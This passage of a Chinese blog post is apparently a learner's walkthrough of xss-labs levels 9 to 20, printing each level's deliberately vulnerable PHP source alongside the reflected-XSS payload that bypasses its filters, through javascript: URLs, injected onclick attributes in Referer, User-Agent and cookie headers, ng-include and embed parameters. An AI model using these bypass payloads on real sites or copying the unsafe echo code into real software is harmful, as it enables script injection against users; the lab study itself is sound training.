+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">部分源码：</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);</span><br><span class="line">echo &#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level9.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(false===strpos($str7,&#x27;http://&#x27;))</span><br><span class="line">&#123;</span><br><span class="line">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>首先我们插入xss发现页面回显：</p>
+<p><img src="/2022/04/21/%E5%9F%BA%E7%A1%80%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/9.png" alt></p>
+<p>通过源码我们知道他是需要匹配<code>http://</code>，否则就显示页面不合法，所以我们要想办法构造一个带有url地址的xss，其他的处理和之前一样。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;//http://www.baidu.com</span><br><span class="line">javascrip&amp;#116;:alert(&#x27;xss&#x27;)//http://www.baidu.com</span><br></pre></td></tr></table></figure>
+<p>需要先用//闭合js语句，并且后面不一定要是完整的url地址，只要出现http://就可以了。</p>
+<h4 id="level10">level10</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">部分源码：</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str11 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>进入level10，发现搜索框没有了，且源码也和之前大有不同。</p>
+<p><img src="/2022/04/21/%E5%9F%BA%E7%A1%80%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/36.png" alt></p>
+<p>不过我们注意到他有三个<code>input</code>标签，意味着有三个参数，名称如上，在变量keyword上尝试插入xss</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&amp;t_link=&quot; type=&quot;text&quot;&amp;t_history=&quot; type=&quot;text&quot;&amp;t_sort=&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure>
+<p>从页面响应发现只有<code>t_sort</code>的value发生了转变，说明我们可以从该标签进行突破。<img src="/2022/04/21/%E5%9F%BA%E7%A1%80%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/21.png" alt></p>
+<p>构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)</span><br></pre></td></tr></table></figure>
+<p>**type=&quot;text&quot;为构造一个文本框，用来触发onclick事件。**并且最后不需要再加引号，后端会补充。</p>
+<h4 id="level11">level11</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">部分源码：</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/04/21/%E5%9F%BA%E7%A1%80%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/03.png" alt></p>
+<p>查看源码发现多了一个名为t_ref的input标签，我们知道html返回中存在refer字段，从下图也可以看出存在xss。</p>
+<p><img src="/2022/04/21/%E5%9F%BA%E7%A1%80%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/39.png" alt></p>
+<p>首先同上一关一样构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&amp;t_link=&quot; type=&quot;text&quot;&amp;t_history=&quot; type=&quot;text&quot;&amp;t_sort=&quot; type=&quot;text&quot;&amp;t_ref=&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure>
+<p>发现也只有<code>t_sort</code>的value发生了转变，并且<code>&quot;</code>被转义为<code>&amp;quot;</code>，其实就是被htmlspecialchars()函数处理了。针对符号被转义了的，我们应该考虑换一个方式，抓包发现原始的请求数据包没有referer请求头，构造发现他其实就是<code>t_ref</code>的value值。</p>
+<p><img src="/2022/04/21/%E5%9F%BA%E7%A1%80%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/46.png" alt></p>
+<p>由此可以从这里插入xss，构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">referer:&quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)</span><br></pre></td></tr></table></figure>
+<p>选择构造文本框触发onclick事件，因为<code>&lt;</code>,<code>&gt;</code>都被替换为空了。</p>
+<h4 id="level12">level12</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">部分源码：</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>通过源码也看出来了，这题就是将<code>User_Agent</code>请求头的值传给<code>t_ua</code>的value，也就抓包在该请求头下构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User_Agent: &quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)</span><br></pre></td></tr></table></figure>
+<h4 id="level13">level13</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">部分源码：</span><br><span class="line">&lt;?php </span><br><span class="line">setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_COOKIE[&quot;user&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>那么这应该就是在cookie下了，构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie: user=&quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)</span><br></pre></td></tr></table></figure>
+<h4 id="level14">level14</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level14&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;</span><br><span class="line">&lt;center&gt;&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xsschallenge/level15.php?src=1.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>level14和之前就相差甚远，首先CTRL+U是没有像之前那样的源码出现，查看题目源码如上，给出了下一题的链接，但是还不清楚这一关考察什么，查看wp说考察<code>Exif xss</code>及<code>&lt;iframe&gt;</code>标签。<img src="/2022/04/21/%E5%9F%BA%E7%A1%80%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/02.png" alt></p>
+<h4 id="level15">level15</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">部分源码：</span><br><span class="line">&lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level16.php?keyword=test&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level15&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到第15关，自己想个办法走出去吧！&lt;/h1&gt;</span><br><span class="line">&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;src&quot;];</span><br><span class="line">echo &#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>在body中有<code>ng-include函数</code>，猜想他的作用可能和include函数一样是写入文件的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ng-include 指令用于包含外部的 HTML 文件。</span><br><span class="line">包含的内容将作为指定元素的子节点。</span><br><span class="line">ng-include 属性的值可以是一个表达式，返回一个文件名。</span><br><span class="line">默认情况下，包含的文件需要包含在同一个域名下。</span><br><span class="line"></span><br><span class="line">特别值得注意的几点如下：</span><br><span class="line">1.ng-include,如果单纯指定地址，必须要加引号</span><br><span class="line">2.ng-include,加载外部html，script标签中的内容不执行</span><br><span class="line">3.ng-include,加载外部html中含有style标签样式可以识别</span><br></pre></td></tr></table></figure>
+<p>那我们的思路就是将xss插入到该函数中，也就是说可以 包含之前有过xss漏洞的源文件（前面所有关卡的插入语句都适用）</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#x27;</span><br></pre></td></tr></table></figure>
+<h4 id="level16">level16</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">部分源码：</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;	&quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br><span class="line">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>在未查看源码前，我们尝试插入xss<img src="/2022/04/21/%E5%9F%BA%E7%A1%80%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/24.png" alt></p>
+<p>发现<code>script</code>和<code>/</code>都被替换为空格（实际上是被替换为空格字符实体）。我们知道插入xss必定少不了要输入空格，那我们将用什么来替换他呢，联想到%0a(换行键)和%0d(回车键)，并且使用不涉及script和/的标签，也就是img。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%0asrc=1%0aonerror=alert(&#x27;xss&#x27;)&gt;</span><br><span class="line">&lt;img%0dsrc=1%0donerror=alert(&#x27;xss&#x27;)&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="level17">level17</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">部分源码：</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/04/21/%E5%9F%BA%E7%A1%80%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/16.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;</span><br><span class="line">b=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot;</span><br></pre></td></tr></table></figure>
+<p>就是说存在两个参数<code>arg01</code>和<code>arg02</code>都被htmlspecialchar()函数处理了。 这两个参数是在embed上，<strong>embed标签定义嵌入的内容（图片）</strong>，并且做了尖括号过滤，那么我们可以加入一个属性进去，生成恶意代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01= onmousemove&amp;arg02=javascript:alert(/xss/)</span><br></pre></td></tr></table></figure>
+<h4 id="level18">level18</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">部分源码：</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>和上一关如出一辙</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01= onmousemove&amp;arg02=javascript:alert(/xss/)</span><br></pre></td></tr></table></figure>
+<h4 id="level19">level19</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">部分源码：</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">echo &#x27;&lt;embed src=&quot;xsf03.swf?&#x27;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&#x27;&quot; width=100% heigth=100%&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>将这一关的源码与上一关对比会发现，主要是单双引号的使用区别， 利用图片信息以及swf特性进行猜测或者flash反编译得到version参数未定义，从而传入恶意代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=version&amp;arg02=&lt;a href=&#x27;javascript:alert(/xss/)&#x27;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p>同时也涉及到<code>flash xss</code>的学习（未开始） <a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/10853379.html">Flash XSS漏洞快速上手 - 卿先生 - 博客园 (cnblogs.com)</a></p>
+<h4 id="level20">level20</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">部分源码：</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">echo &#x27;&lt;embed src=&quot;xsf04.swf?&#x27;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&#x27;&quot; width=100% heigth=100%&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>插件不同。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=id&amp;arg02=\%22))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(1)//&amp;width&amp;height</span><br></pre></td></tr></table></figure>
+<h4 id="总结">总结</h4>
+<p>关于反射型的xss的学习还是比较仓促的，只是大概了解了一下，还没到自主做题的层次，后续会再来学习。</p>
+</section>
+    <!-- Tags START -->
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2022/04/12/misc%E4%B9%8B%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/">
+        <span class="nav-arrow">← </span>
+        
+          misc之内存取证
+        
+      </a>
+    
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+      <div class="qrcode">
+        <canvas id="share-qrcode"></canvas>
+        <p class="notice">扫描二维码，分享此文章</p>
+      </div>
+    
+    <!-- 二维码 END -->
+    
+      <!-- Utterances START -->
+      <div id="utterances"></div>
+      <script src="https://utteranc.es/client.js"
+        repo=""
+        issue-term="pathname"
+        theme="github-light"
+        crossorigin="anonymous"
+        async></script>    
+      <!-- Utterances END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#XSS-%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-nav-text">XSS 漏洞简介</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#XSS%E9%AA%8C%E8%AF%81%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-nav-text">XSS验证沙箱逃逸</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#XSS%E5%B8%B8%E8%A7%81%E7%9A%84%E8%A7%A6%E5%8F%91%E6%A0%87%E7%AD%BE"><span class="toc-nav-text">XSS常见的触发标签</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#level1"><span class="toc-nav-text">level1</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#level2"><span class="toc-nav-text">level2</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#level3"><span class="toc-nav-text">level3</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#level4"><span class="toc-nav-text">level4</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#level5"><span class="toc-nav-text">level5</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#level6"><span 